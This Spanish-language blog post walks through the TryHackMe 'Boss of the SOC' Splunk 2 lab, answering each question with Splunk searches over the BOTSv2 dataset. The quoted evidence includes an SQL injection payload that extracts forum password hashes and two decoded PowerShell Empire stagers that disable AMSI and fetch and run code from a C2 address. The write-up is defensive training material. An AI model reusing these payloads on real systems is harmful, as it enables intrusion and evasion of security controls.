---
layout: post
title: Boss of the SOC | TryHackMe Splunk 2
description: Write-up del Boss of the SOC de TryHackMe correspondiente al lab Splunk 2
tags: [ tryhackme , casos-de-uso, splunk, soc, write-ups ]
---

# Indice

1. [Introducción](#introduction)

2. [100 series questions](#100)

3. [200 series questions](#200)

4. [300 series questions](#300)

5. [400 series questions](#400)


# Introducción<a id="introduction"></a>

En el ejercicio de hoy quiero mejorar mis conocimientos de Splunk. Para ello, voy a practicar con el CTF [Boss of the SOC](https://github.com/splunk/botsv2) desarrollado por Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve y James Brodsky. Crearon un laboratorio con varias máquinas y simularon un montón de eventos, para después guardar todos los logs y así crear un escenario perfecto para practicar. 

En realidad, el CTF es mucho más amplio que el ejercicio que haré hoy. Hoy probaré con el reto que propone  [TryHackMe](https://tryhackme.com/room/splunk2gcd5) que toma como base algunas preguntas del reto inicial. 

Para ello, tengo instalada mi versión de [Splunk Enterprise](https://www.splunk.com) (recordad que hay 60 días de prueba gratuíta) y me he bajado el [BOTS V2 Dataset (Attack Only)](https://github.com/splunk/botsv2) del repositorio de GitHub. Una vez hecho esto, he descomprimido el dataset dentro de C:\Program Files\Splunk\etc\apps y una vez hecho esto he abierto Splunk. También puedes utilizar la máquina de TryHackMe, pero me resulta mucho más cómodo trabajar en local.

# 100 series questions <a id="100"></a>

Pregunta 1: Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited?

Comienzo por una simple búsqueda. Tal y como me indican, buscamos un dominio, es decir que el tipo de conexión habrá sido http:

```
index="botsv2" amber
```

103.000 resultados. Filtro por "pan:traffic".


```
index="botsv2" amber "pan:traffic"
```

Los resultados me dan una IP que se repite: 10.0.2.101. Esa debe de ser la IP de Amber Turing. Filtro de nuevo con la IP y el tipo de conexión http:

```
index="botsv2" src_ip="10.0.2.101" sourcetype="stream:http"
```

Me da muchos resultados de nuevo, con un montón de sitios visitados. En la descripción del ejercicio nos dicen que Amber trabaja en una empresa de cerveza. Así que busco por resultados que contengan la palabra `beer` y elimino los duplicados.

```
index="botsv2" src_ip="10.0.2.101" sourcetype="stream:http" "*beer*" | dedup site
```

Respuesta: `www.berkbeer.com`

Pregunta 2: Amber found the executive contact information and sent him an email. What image file displayed the executive's contact information? Answer example: /path/image.ext

Una vez tenemos el nombre del dominio, voy a filtrar por el protocolo smtp.

```
index="botsv2" sourcetype="stream:smtp" "*@berkbeer.com"
``` 

Nos da 6 resultados. Leo la cadena de emails, y filtro en mi navegador por "png" ya que hay un montón de contendio. Encuentro el logo: `/images/ceoberk.png`  


Pregunta 3: What is the CEO's name? Provide the first and last name.

Leyendo la cadena de emails encuentro uno cuyo contenido es:

```
Hello Amber,=C2=A0=0A=0AGreat to hear from you, yes it is unfortunate th=
e way things turned=0Aout. It would be great to speak with you directly,=
 I would also like=0Ato have Bernhard on the call as I think he might ha=
ve some questions=0Afor you. =C2=A0Give me a call this afternoon if you=
 are free.=C2=A0=0A=0AMartin Berk=0ACEO=0A777.222.8765=0Amberk@berkbeer.=
com=0A=0A----- Original Message -----=0AFrom: "Amber Turing" <aturing@fr=
oth.ly>=0ATo:"mberk@berkbeer.com" 
``` 
Por tanto `Martin Berk ` es el nombre del CEO

Pregunta 4: What is the CEO's email address?

En la pregunta anterior aparece: `mberk@berkbeer.com`.

Pregunta 5: After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?

En la cadena de correos hay otro para Bernard: `hbernhard@berkbeer.com`.

Pregunta 6: What is the name of the file attachment that Amber sent to a contact at the competitor?

Si buscamos por `attach_filename` nos aparece: `Saccharomyces_cerevisiae_patent.docx `

Pregunta 7: What is Amber's personal email address?

Uno de los correos está codificado. Pero en `content_transfer_encoding` nos aparece que está codificado en base64. Así que con [este recurso](https://www.base64decode.org/) podemos ver el contenido:

```
<p class="MsoNormal">Thanks for taking the time today, As discussed here is the document I was referring to.&nbsp; Probably better to take this offline. Email me from now on at
<a href="mailto:ambersthebest@yeastiebeastie.com">ambersthebest@yeastiebeastie.com</a>
```

Respuesta: `ambersthebest@yeastiebeastie.com


# 200 series questions <a id="200"></a>

Pregunta 1: What version of TOR Browser did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter. 

Busco por tor.exe y ordeno los resultados por el más antiguo primero, ya que debe de ser el correspondiente a la instalación de Tor.

```
index="botsv2" tor.exe | reverse
```

Me aparecen varios eventos relacionados con Tor, pero no la versión. Filtro un poco más añadiendo "install". 

```
C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe
```

Es decir :  `7.0.4`

Pregunta 2: What is the public IPv4 address of the server running www.brewertalk.com?

Comienzo mi búsqueda:

```
index="botsv2" www.brewertalk.com
```

Si filtro por src_ip aparecen varias. La primera es 172.31.0.249, después aparece 172.31.0.2, y después 52.42.208.228. Las dos primeras son del rango de las IPs privadas (puedes leer el [RFC 1918](https://www.rfc-es.org/rfc/rfc1918-es.txt) si quieres saber más). Y la tercera es una IP pública.

Respuesta: `52.42.208.228`.

Pregunta 3: Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.

Haremos algo parecido a lo anterior, pero al revés. Buscamos por src_ip. Vamos a ordenar por las que más interaccionan con el sitio ( intuyo que la que más interacción tenga será porque está haciendo un escaneo ), y coger el primer resultado:

```
index="botsv2" www.brewertalk.com | stats count by src_ip | sort -count
```

Respuesta: `45.77.65.211`.


Pregunta 4: The IP address from Q#2 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php

*NOTA: Aunque claramnte pone la IP de Q#2, se trata de la IP de la pregunta 3. ¡ No os volváis locos buscando por la 52.42.208.228!

```
index="botsv2" src_ip="45.77.65.211"
```

Aparecen 18.811 resultados. Si pincho en uri_path, hay 662 peticiones a /member.php (el siguiente resultado tiene 162.). Respuesta: `/member.php`

Pregunta 5: What SQL function is being abused on the URI path from the previous question?

Filtrando por lo anterior, vemos la respuesta del servidor en el primer evento:
```
SQL Error:</dt>\n<dd>1105 - XPATH syntax error: ':f'</dd>\n<dt>Query:</dt>\n<dd>\r\n\t\t\tSELECT q.*, s.sid\r\n\t\t\tFROM mybb_questionsessions s\r\n\t\t\tLEFT JOIN mybb_questions q ON (q.qid=s.qid)\r\n\t\t\tWHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1'\r\n\t\t</dd>\n</dl>\n\n\t\t\t\t<p id=\"footer\">Please contact the <a href=\"http://www.mybb.com\">MyBB Group</a> for technical support.</p>\n\t\t\t</div>\n\t\t</div>\n\t</div>
```

Así que la respuesta es `updatexml`.

Pregunta 6: What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of an XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.

Para ejecutar un ataque XSS básico se suele incluír el elemento `<script>`. Teniendo en cuenta esto y que el navegador corresponde al usuario Kevin.

```
index="botsv2" kevin "<script>"
```

Nos da 1 resultado. Si filtramos por Cookie, la respuesta es `1502408189`.

Pregunta 7: What brewertalk.com username was maliciously created by a spear phishing attack?`

Busco por brewertalk.com y username. Además, ya que el usuario ha sido creado, probablemente se haya realizado mediante un formulario, así que añado el method POST.

```
index="botsv2" "brewertalk.com" "username" http_method=POST
```
Muchos resultados pero en todos el mismo username: `kIagerfield`

# 300 series questions <a id="300"></a>

Pregunta 1: Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. What is the name of this file after it was encrypted? 

Empiezo filtrando por Mallory

```
index="botsv2" mallory
```

Aparecen más de 6700 resultados, así que hay que afinar un poco más. Se me ocurre que PowerPoint tiene la extensión .pptx, así que la incluyo en la búsqueda:

```
index="botsv2" mallory "pptx"
```

Y efectivamente, en el primer resultado aparece la respuesta: `filename Frothly_marketing_campaign_Q317.pptx.crypt`


Pregunta 2: 

There is a Games of Thrones movie file that was encrypted as well. What season and episode is it? 

Voy a buscar ahora por archivos con el nombre "Game of Thrones"

```
index="botsv2" "Mallory" "Game of Thrones"
```

Aparece un resultado pero se trata de un correo en el que hablan de la serie. Voy a intentarlo con el acrónimo "GoT", aunque debido a que Got en el inglés es un verbo frecuente, me temo que aparecerán muchas coincidencias...

```
index="botsv2" "Mallory" "GoT"
```

Afortunadamente sólo aparecen dos. Si además pincho en `attach_filetype` hay una que es `application/x-bittorrent`. Justo lo que busco. Respuesta: `GoT.S7E2.BOTS.BOTS.BOTS.mkv.torrent` . Para que Tryhackme de la respuesta como válida, el formato es `S07E02`.

Pregunta 3: Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.

Primeramente buscaré por "kutekitten" y "usb". 40 eventos. Me aconsejan utilizar el time correlation, así que intento ver los resultados en una tabla por tiempo. 

```
index="botsv2" kutekitten usb | table calendarTime
```
La mayor parte de los eventos ocurren el 3 de Agosto de 2017. Filtro por esos eventos pero no encuentro nada relacionado con la marca del USB en cuestión. Busco en Google ayuda pero la mayoría de las queries que aporta la comunidad son para eventos registrados en Windows, y como estamos ante un MacBook la ayuda sirve de poco. Así que intento filtar por "vendor". 

```
index="botsv2" kutekitten usb vendor
```

Aparecen sólo 5 resultados. Dos tienen un código de "vendor_id": 058F y 13F3. Busco [aquí](https://devicehunt.com/all-usb-vendors) y aparecen dos marcas: `Kingston Technology Company Inc.` y `Alcor Micro Corp.`... Pruebo con ambas y la segunda resulta ser la acertada. 

Pregunta 4: What programming language is at least part of the malware from the question above written in?

Dado que en la pregunta anterior vimos que el USB se insertó el 3 de Agosto a las 18 horas, busco por eventos que ocurrieran después de esa hora. Obviamente hay miles, así que he de filtrar algo más. No miento si digo que este proceso me lleva más de dos horas, pero al final deduzco que si se ha ejecutado algo, ha debido de ser dentro del $PATH de Mallory. Es decir, en la carpeta "/Users/". Lo intento por ahí:

```
index=botsv2 host="kutekitten" "\\/Users/" date_month=august date_mday=3
```

La búsqueda se reduce. Entre los resultados, encuentro un campo:  "decorations.username"=mkraeusen. Éste debe de ser el nombre de usuario de Mallory. Lo itento de nuevo:

```
index=botsv2 host="kutekitten" "\\/Users\\/mkraeusen" date_month=august date_mday=3
```

153 eventos. Vamos afinando el tiro. Voy filtrando por campos interesantes, "columns.path", "columns.pid"... Investigo procesos sosprechosos con bash y perl, pero no encuentro nada definitivo. Y por fin, doy con un campo "columns.sha256". Se trata de un malware que se obfusca, por tanto es lógico que utilice un algoritmo como sha256. Copio el hash que aparece y realizo una búsqueda en [virustotal](https://www.virustotal.com/gui/file/befa9bfe488244c64db096522b4fad73fc01ea8c4cd0323f1cbdee81ba008271). El resultado: 32 security vendors and no sandboxes flagged this file as malicious. En los detalles aparece `File type: Perl`. Ya tengo la respueta la pregunta 4. 

Pregunta 5: When was this malware first seen in the wild? Answer Guidance: YYYY-MM-DD

La respuesta aparece en los detalles de VirusTotal: 2017-01-17 19:09:06 UTC, es decir `2017-01-17`


Pregunta 6: The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?

De nuevo, en la página de Virustotal podemos ir a `Behaviour` y encontrar la respuesta `eidk.duckdns.org`

Pregunta 7: From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server?

Lo mismo que la anterior. Respuesta: `eidk.hopto.org`

# 400 series questions <a id="400"></a>

Pregunta 1: A Federal law enforcement agency reports that Taedonggang often spear phishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?

Tal y como nos dicen, el archivo es un .zip y es enviado por mail. Por tanto, stream:smtp.

```
index="botsv2" sourcetype="stream:smtp" *.zip
```
Aparecen unos pocos resultados y la respuesta se ve en seguida: `invoice.zip`.

Pregunta 2: What is the password to open the zip file?

Si ordenamos los resultados y abrimos el último por el apartado content_body, vemos que el cuerpo del mensaje incluye el password: `912345678`

Pregunta 3: The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.

En el apartado de la serie [200](#200) habíamos dado con una IP que estaba escaneando brewertalk.com. Debemos usar esta IP como filtro (esta pista nos la dan en TryHackMe). Por otro lado, tal y como aparece descrito [aquí](https://www.rfc-editor.org/rfc/rfc4346#section-1) SSL y TLS actúan encima del protocolo de transporte, así que hablamos en este caso de TCP. Así que dicho esto, usaremos stream:tcp. Con estos dos parámetros ya podemos buscar:

```
index="botsv2" sourcetype="stream:tcp" 45.77.65.211
```

Si nos fijamos en el campo ssl_issuer veremos que la respuesta es : `C = US`.

Pregunta 4: What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?

Buscamos por :

```
index=botsv2 "winsys32.dll"
```

Aparecen unos pocos resultados, todos utilizan FTP para bajar el winsys32.dll mediante C:\Windows\System32\ftp.exe. Así que filtro por ftp:

```
index=botsv2 sourcetype="stream:ftp"
```
1490 resultados... Filtro por methods. Hay unos cuantos (PORT, STOR, RETR, TYPE, CWD, PASS...) [busco](https://en.wikipedia.org/wiki/List_of_FTP_commands) cuál es el método para bajar archivos y lo más parecido es RETR (to retrieve a copy of a file). 

```
index="botsv2" sourcetype="stream:ftp" method=RETR
```

Y aparece un filename: `나는_데이비드를_사랑한다.hwp` 

Pregunta 5: What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith

TryHackMe nos da una pista: [la web de VirusTotal](https://www.virustotal.com/gui/file/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1/detection) en la que aparecen los detalles del invoice.zip maligno de las preguntas iniciales. Ahí vemos la respuesta: `Author: Ryan Kovar`.

Pregunta 6: Within the document, what kind of points is mentioned if you found the text?

TryHackMe nos da una pista: [la web de Hybrid Analysis](https://www.hybrid-analysis.com/sample/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1/598155a67ca3e1449f281ac4) en la que aparecen capturas de pantallas del documento. Y el texto incluye `CyberEastEgg points`.


Pregunta 7: To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html

En Windows los Sceduled Tasks se llevan a cabo a través de [schtasks.exe](https://docs.microsoft.com/es-es/windows-server/administration/windows-commands/schtasks). Así que empiezo filtrando por ahí.

```
index="botsv2" schtasks.exe
```

103 resultados. Generalmente, si se ejecuta algún comando mediante la terminal, se loguea mediante los eventos de Sysmon. Además, quiero pensar que el comando se ejecuta con Powershell. Es decir:

```
index="botsv2" schtasks.exe source="WinEventLog:Microsoft-Windows-Sysmon/Operational powershell.exe"
```

Aparecen 3 resultados. En el apartado de data aparece:

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlA...
#continua
```

Si hacemos un decode de la data con base64, el resultado es:

```
[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed','NonPublic,Static').SEtVaLuE($NULl,$trUE)};[SYstEM.Net.SERviCePoINtMAnAGer]::EXpEct100ContInuE=0;$Wc=NeW-Object SyStEM.NeT.WeBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaDers.Add('User-Agent',$u);$WC.ProxY=[SYstEm.Net.WEBREQUest]::DeFaulTWEBPROxY;$Wc.ProxY.CReDenTiaLs = [SysTem.NeT.CredEntIAlCache]::DefAultNeTWorkCrEDeNTIAls;$K=[SysTem.TexT.EncODING]::ASCII.GetBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};$wc.HEADeRs.AdD("Cookie","session=MvCdddPqFQ54VL4OWU5ryRTUir8=");$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER+$t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV+$K))|IEX
```

/admin/get.php no es la respuesta correcta para TryHackme. Así que pruebo de nuevo. Hay otro resultado que apunta a `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))`. Por tanto, busco ahora en el WinRegistry por ese registro:

```
index="botsv2" "Software\\Microsoft\\Network" source=WinRegistry
```

Y el resultado es otro diferente, que decodifico con base64 y ahora me encuentro con /news.php. Tampoco es la respuesta. Hay más registros, así que los pruebo todos y este es el correcto:

```
[REF].ASSeMbly.GETTYPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFiElD('amsiInitFailed','NonPublic,Static').SeTVaLUE($nULl,$trUE)};[SYSTem.NEt.SErVicePoiNtMaNAgeR]::ExPECT100COntInuE=0;$WC=NEw-ObjECt SySTEm.Net.WeBCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HeAders.ADD('User-Agent',$u);$wc.PrOXy=[SystEm.NET.WebReQUeST]::DEFauLtWebPROXy;$Wc.ProXy.CREdEntIals = [SysteM.Net.CrEdeNTIAlCAche]::DEFaULTNETWOrKCredEntiAlS;$K=[SystEM.TeXt.EncOdINg]::ASCII.GetBytEs('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ARGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BxoR$S[($S[$I]+$S[$H])%256]}};$Wc.HEADERs.ADd("Cookie","session=fv/ijFXJQVAkasZQRTqeo2/cnrE=");$ser='https://45.77.65.211:443';$t='/login/process.php';$data=$WC.DoWNloadDAta($ser+$t);$iV=$dATa[0..3];$dAta=$DAta[4..$dAtA.Length];-jOIn[CHAR[]](& $R $dAta ($IV+$K))|IEX
```

Es decir, respuesta : `process.php`.